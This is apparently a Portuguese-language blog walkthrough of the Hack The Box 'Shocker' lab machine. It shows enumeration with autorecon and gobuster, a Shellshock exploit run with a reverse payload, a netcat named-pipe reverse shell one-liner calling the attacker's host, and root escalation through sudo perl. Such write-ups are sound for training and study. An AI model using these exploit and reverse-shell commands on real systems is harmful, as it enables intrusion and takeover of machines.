---
title:     "Hack The Box - Shocker"
tags: [linux,easy, CVE 2014-6278, CVE 2014-6271, sudo perl]
categories: Linux
---

![1.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-shocker/1.jpg)

## Enumeration

Conforme venho automatizando o processo inicial de enumeracao e tbm adicionei algumas regras para gerenciar melhor meu tempo.

Inicio com o autorecon e em paralelo vou enumerando manualmente para ganhar tempo, visto que o autorecon dura um pouco mais de uma hora...

Eu terminei essa maquina em 70 minutos e o autorecon ainda nao tinha terminado..

Vamos laaa

`autorecon --single-target 10.10.10.56`

![2.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-shocker/2.jpg)

Em paralelo eu comecei fazer outros scan specificos e algumas pesquisas, depois de alguns minutos fui dar uma olhada no results do autorecon e ja encontrei algo interessante

![3.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-shocker/3.jpg)

Como podes observar existe o dir `/cgi-bin/` no entanto eu ainda precisava encontrar um `file` com a extension `.cgi ou .sh ` para o exploit funcionar

entao usando o gobuster, rapidamente encontro o que eu precisava...

`gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.56/cgi-bin/ -t 30 -x cgi -t 40`

![4.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-shocker/4.jpg)

## Reverse Shell

Um busca rapida no google vc encontra algumas tools paraa automatizar o processo de reverse shell

***reference*** https://github.com/offensive-security/exploitdb/blob/master/exploits/linux/remote/34900.py

`python 34900.py payload=reverse rhost=10.10.10.56 lhost=10.10.14.24 lport=53 pages=/cgi-bin/user.sh`

![5.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-shocker/5.jpg)

Precisa obter uma shell mais funcional, isso eh facil e rapido de fazer...

`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.24 443 >/tmp/f`

![6.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-shocker/6.jpg)

## Spawn shell

```
$ python -c 'import pty;pty.spawn("/bin/bash")';
/bin/sh: 1: python: not found
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
```

## Privilege Escalation

Bom, rapidamente encontro os vetores para escalar privilegios..

usando o `sudo -l` e o comando `id`

![7.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-shocker/7.jpg)

voce pode tbm utilizar outras tools que faz isso de forma automatica, lembre-se tempo eh ourooooo..

veja que voce pode executar o `perl`  como root usando o `sudo` e tbm o nosso user faz parte do grupo `110(lxd)` que tbm eh possivel escalar por ele. Nao vou abordar isso aqui,, se vc quiser veja isso https://www.hackingarticles.in/lxd-privilege-escalation/


### Using sudo perl

com o site https://gtfobins.github.io/gtfobins/perl/#sudo voce encontra rapidamente os comandos necessarios para fazer isso...

`sudo /usr/bin/perl -e 'exec "/bin/sh";'`

![8.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-shocker/8.jpg)


